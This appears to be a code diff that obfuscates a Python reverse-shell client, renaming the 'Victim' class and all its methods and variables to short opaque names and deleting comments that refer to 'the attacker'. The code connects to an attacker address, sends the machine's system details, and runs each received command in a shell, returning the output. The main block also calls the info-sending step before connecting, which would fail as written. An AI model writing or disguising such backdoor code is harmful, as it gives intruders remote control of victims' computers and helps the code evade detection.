@@ -1,79 +1,70 @@
-import os
 import socket
-import subprocess
-import platform
-import psutil
+import subprocess as sp
+import platform as plt
+import psutil as ps
 
-class Victim:
-  def __init__(self, server_ip, server_port):
-    self.server_ip = server_ip
-    self.server_port = server_port
-    self.client = None
+class V:
+  def __init__(s, i, p):
+    s.i = i
+    s.p = p
+    s.c = None
 
-  def get_local_ip(self):
-    # Get the local IP address of the victim's machine
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    local_ip = s.getsockname()[0]
-    s.close()
-    return local_ip
+  def g_l_i(s):
+    s_o = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s_o.connect(("8.8.8.8", 80))
+    l_i = s_o.getsockname()[0]
+    s_o.close()
+    return l_i
 
-  def connect_to_server(self):
-    local_ip = self.get_local_ip()
-    self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  def c_t_s(s):
+    l_i = s.g_l_i()
+    s.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     print("Msg: Client Initiated...")
-    self.client.connect((self.server_ip, self.server_port))
+    s.c.connect((s.i, s.p))
     print("Msg: Connection initiated...")
 
-  def send_system_info(self):
-    system_info = f"System: {platform.system()}\n"
-    system_info += f"Node Name: {platform.node()}\n"
-    system_info += f"Release: {platform.release()}\n"
-    system_info += f"Version: {platform.version()}\n"
-    system_info += f"Machine: {platform.machine()}\n"
-    system_info += f"Processor: {platform.processor()}\n"
+  def s_s_i(s):
+    s_i = f"System: {plt.system()}\n"
+    s_i += f"Node Name: {plt.node()}\n"
+    s_i += f"Release: {plt.release()}\n"
+    s_i += f"Version: {plt.version()}\n"
+    s_i += f"Machine: {plt.machine()}\n"
+    s_i += f"Processor: {plt.processor()}\n"
 
-    self.client.send(system_info.encode())
+    s.c.send(s_i.encode())
 
-  def online_interaction(self):
-    self.send_system_info() # Send system information when connected
+  def o_i(s):
+    s.s_s_i()
     while True:
         print("[+] Awaiting Shell Commands...")
-        user_command = self.client.recv(1024).decode()
+        u_c = s.c.recv(1024).decode()
 
-        if user_command.strip() == "exit":
+        if u_c.strip() == "exit":
             break
 
-        # Check if the command is for changing directory
-        if user_command.startswith("cd"):
+        if u_c.startswith("cd"):
             try:
-                # Extract the directory path from the command
-                directory_path = user_command.split(" ", 1)[1]  # Split only once to preserve spaces
-                # Change directory
-                os.chdir(directory_path)
-                # Send confirmation message to the attacker
-                self.client.send(f"Changed directory to: {os.getcwd()}".encode())
+                d_p = u_c.split(" ", 1)[1]
+                sp.os.chdir(d_p)
+                s.c.send(f"Changed directory to: {sp.os.getcwd()}".encode())
             except Exception as e:
-                # If an error occurs, send error message to the attacker
-                self.client.send(f"Error changing directory: {str(e)}".encode())
+                s.c.send(f"Error changing directory: {str(e)}".encode())
         else:
-            # Execute other commands
-            op = subprocess.Popen(user_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-            output = op.stdout.read()
-            output_error = op.stderr.read()
+            o_p = sp.Popen(u_c, shell=True, stderr=sp.PIPE, stdout=sp.PIPE)
+            o = o_p.stdout.read()
+            o_e = o_p.stderr.read()
 
             print("[+] Sending Command Output...")
-            if output == b"" and output_error == b"":
-                self.client.send(b"client_msg: no visible output")
+            if o == b"" and o_e == b"":
+                s.c.send(b"client_msg: no visible output")
             else:
-                self.client.send(output + output_error)
-
-
+                s.c.send(o + o_e)
 
 if __name__ == "__main__":
-  attacker_ip =  '127.0.0.1'
-  victim = Victim(attacker_ip, 4000) # Pass the local IP address
-  victim.send_system_info()
-  victim.connect_to_server()
-  victim.online_interaction()
+  a_i = '127.0.0.1'
+  v = V(a_i, 4000)
+  v.s_s_i()
+  v.c_t_s()
+  v.o_i()
+
